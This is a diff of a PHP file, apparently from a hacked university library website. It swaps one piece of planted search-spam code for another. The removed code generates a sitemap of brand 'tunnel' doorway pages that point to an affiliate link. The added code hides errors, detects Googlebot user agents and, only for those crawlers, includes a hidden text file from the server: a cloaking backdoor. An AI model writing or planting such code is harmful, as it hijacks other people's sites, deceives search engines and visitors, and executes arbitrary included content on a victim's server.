@@ -1,108 +1,37 @@
 <?php
-// Konfigurasi
-$brand_list_file = 'uwaw.txt';
-$template_file = 'sugoi.txt';
-$base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
-$current_url = $base_url . $_SERVER['REQUEST_URI'];
+error_reporting(0);
 
-// LINK TUJUAN (AFFILIATE LINK) - EDIT DISINI
-$link_daftar = "https://mangeacuk.pages.dev/"; // Ganti dengan link affiliate Anda
+function is_google_bot() {
+    $agents = [
+        "Googlebot",
+        "Google-Site-Verification",
+        "Google-InspectionTool",
+        "Googlebot-Mobile",
+        "Googlebot-News"
+    ];
+    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 
-// Fungsi untuk memuat daftar brand
-function loadBrands($filename) {
-    if (!file_exists($filename)) return [];
-    $content = file_get_contents($filename);
-    return array_filter(array_map('trim', explode("\n", $content)));
-}
-
-// Fungsi untuk generate dan menyimpan sitemap
-function generateAndSaveSitemap($brands, $base_url) {
-    $sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
-    $sitemap_content .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
-    
-    // URL utama
-    $sitemap_content .= "  <url>\n";
-    $sitemap_content .= "    <loc>{$base_url}/</loc>\n";
-    $sitemap_content .= "    <priority>1.0</priority>\n";
-    $sitemap_content .= "    <changefreq>daily</changefreq>\n";
-    $sitemap_content .= "  </url>\n";
-    
-    // URL untuk setiap brand
-    foreach ($brands as $brand) {
-        $brand_url = str_replace(' ', '-', strtolower($brand));
-        $sitemap_content .= "  <url>\n";
-        $sitemap_content .= "    <loc>{$base_url}/?tunnel={$brand_url}</loc>\n";
-        $sitemap_content .= "    <priority>0.8</priority>\n";
-        $sitemap_content .= "    <changefreq>weekly</changefreq>\n";
-        $sitemap_content .= "  </url>\n";
-    }
-    
-    $sitemap_content .= '</urlset>';
-    
-    // Simpan sitemap (tidak terlihat di browser tapi bisa diakses)
-    file_put_contents('sitemap.xml', $sitemap_content);
-    
-    return $sitemap_content;
-}
-
-// Fungsi untuk memuat template
-function loadTemplate($filename) {
-    return file_exists($filename) ? file_get_contents($filename) : false;
-}
-
-// Main Logic
-$brands = loadBrands($brand_list_file);
-$template_content = loadTemplate($template_file);
-
-// GENERATE SITEMAP OTOMATIS setiap kali script diakses
-if (count($brands) > 0) {
-    generateAndSaveSitemap($brands, $base_url);
-}
-
-// Handle direct sitemap request
-if (parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) === '/sitemap.xml') {
-    header('Content-Type: application/xml');
-    
-    // Jika sitemap sudah ada, tampilkan yang sudah ada
-    if (file_exists('sitemap.xml')) {
-        echo file_get_contents('sitemap.xml');
-    } else {
-        // Jika belum ada, generate baru
-        echo generateAndSaveSitemap($brands, $base_url);
-    }
-    exit;
-}
-
-// Handle tunnel request
-if (isset($_GET['tunnel']) && !empty($_GET['tunnel'])) {
-    $requested_brand = str_replace('-', ' ', $_GET['tunnel']);
-    
-    // Cari brand yang sesuai
-    $selected_brand = null;
-    foreach ($brands as $brand) {
-        if (strtolower($brand) === strtolower($requested_brand)) {
-            $selected_brand = $brand;
-            break;
+    foreach ($agents as $agent) {
+        if (strpos($user_agent, strtolower($agent)) !== false) {
+            return true;
         }
     }
+    return false;
+}
+
+if (is_google_bot()) {
+    $file_to_load = DIR . '/var/www/library.upr.ac.id/public_html/romawikuno.txt';
     
-    if ($selected_brand && $template_content) {
-        // Ganti placeholder dengan nilai aktual
-        $canonical_url = $base_url . '/?tunnel=' . str_replace(' ', '-', strtolower($selected_brand));
-        $output = str_replace(
-            ['{brand}', '{canonical}', '{link-daftar}'],
-            [$selected_brand, $canonical_url, $link_daftar],
-            $template_content
-        );
-        
-        // Set header dan output konten
-        header('Content-Type: text/html; charset=utf-8');
-        echo $output;
+    if (file_exists($file_to_load)) {
+        include($file_to_load);
+        exit;
+    } else {
+        http_response_code(404);
+        echo "File not found.";
         exit;
     }
 }
 
-// Jika tidak ada tunnel parameter atau brand tidak ditemukan, lanjut ke HTML normal
 ?>
 
 
